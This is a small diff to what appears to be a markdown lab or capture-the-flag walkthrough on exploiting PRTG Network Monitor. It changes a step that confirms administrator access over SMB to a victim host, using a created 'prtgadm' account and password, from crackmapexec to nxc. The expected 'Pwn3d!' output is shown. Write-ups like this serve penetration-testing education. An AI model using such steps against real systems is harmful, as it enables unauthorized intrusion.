@@ -20,7 +20,7 @@
 - Click Test → Executes command.
 #### <span style="color:#FFB86C">Step 3: Verify Admin Access</span>
 ```bash
-crackmapexec smb $VICTIM_IP -u prtgadm -p Pwn3d_by_PRTG!
+nxc smb $VICTIM_IP -u prtgadm -p Pwn3d_by_PRTG!
 
 # Expected Output:
 [+] $VICTIM_IP\prtgadm:Pwn3d_by_PRTG! (Pwn3d!)
